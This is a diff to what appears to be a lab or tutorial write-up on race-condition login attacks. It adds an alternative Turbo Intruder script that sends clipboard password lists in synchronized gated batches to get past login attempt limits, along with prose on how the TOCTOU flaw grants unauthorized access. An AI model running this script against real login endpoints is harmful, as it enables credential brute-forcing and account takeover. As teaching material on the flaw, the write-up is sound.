@@ -140,6 +140,7 @@ If connection warming doesn’t work, intentionally flooding the server with dum
   <figcaption style="color: red;">Fig 2: Observe the remaining attempts.</figcaption>
 </figure><br>
 
+
 **Step-3:** Navigate to the **third** request in **`Intruder`** and examine the response to check the remaining attempts.
 
 <style>
@@ -318,7 +319,35 @@ def queueRequests(target, wordlists):
 def handleResponse(req, interesting):
     table.add(req)
 ```
-
+## OR
+```
+def queueRequests(target, wordlists):
+    # Use HTTP/2 for a single-packet attack
+    engine = RequestEngine(
+        endpoint=target.endpoint,
+        concurrentConnections=5,  # Allow parallel request queuing
+        engine=Engine.BURP2
+    )
+    # Get passwords from clipboard
+    passwords = wordlists.clipboard
+    # Use multiple gates to avoid Turbo Intruder's 99-request limit
+    max_per_gate = 50  # Adjust based on testing
+    gate_index = 1
+    current_gate = "race" + str(gate_index)  # Fixed string formatting
+    count = 0
+    for password in passwords:
+        engine.queue(target.req % password, gate=current_gate)
+        count += 1
+        # If we reach the max_per_gate limit, switch to a new gate
+        if count % max_per_gate == 0:
+            engine.openGate(current_gate)  # Release current batch
+            gate_index += 1
+            current_gate = "race" + str(gate_index)  # Fixed formatting
+    # Ensure the last batch is sent
+    engine.openGate(current_gate)
+def handleResponse(req, interesting):
+    table.add(req)
+```
 🔹This approach targets systems vulnerable to **`TOCTOU (Time-of-Check to Time-of-Use)`** flaws, where concurrent requests may result in a successful login even if **traditional defenses** are in place. When one of the synchronized requests contains valid credentials, the **race condition** may allow `unauthorized access` before the system processes invalid attempts. This technique is particularly effective against applications that do not implement proper `concurrency control` during authentication checks.
 
 
